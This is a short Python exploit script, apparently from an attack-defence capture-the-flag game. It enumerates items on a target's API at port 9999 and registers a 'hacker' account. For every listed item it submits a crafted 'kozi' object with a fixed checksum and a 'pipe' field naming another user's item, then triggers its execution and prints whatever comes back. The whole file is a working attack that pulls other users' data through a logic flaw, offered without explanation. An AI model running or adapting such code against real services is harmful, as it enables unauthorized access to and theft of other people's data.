import sys
import requests
import json

ip = sys.argv[1]

url = f"http://{ip}:9999/api"

l = requests.get(f"{url}/list/").json()['result']

s = requests.Session()

s.post(f"{url}/register/", json={
    "username": "hacker",
    "password": "hacker"
})

s.post(f"{url}/login/", json={
    "username": "hacker",
    "password": "hacker"
})

d = {}

for k in l:
    try:
        s.post(f"{url}/kozi/", json={
            "name": k.split('_')[1],
            "fortune": "A",
            "checksum": "49890c1acd8ce939b0ee5567d2c6a9662b47c1b2d74d7698d2ee025fc2cb7b291eba4eb55f3200990f1a5aad35d3558b432084c5468a7a9a7a2564eb2a232d3b",
            "pipe": k
        })

        r = s.get(f"{url}/exec_kozi/hacker_{k.split('_')[1]}/")

        print(r.text)
    except:
        pass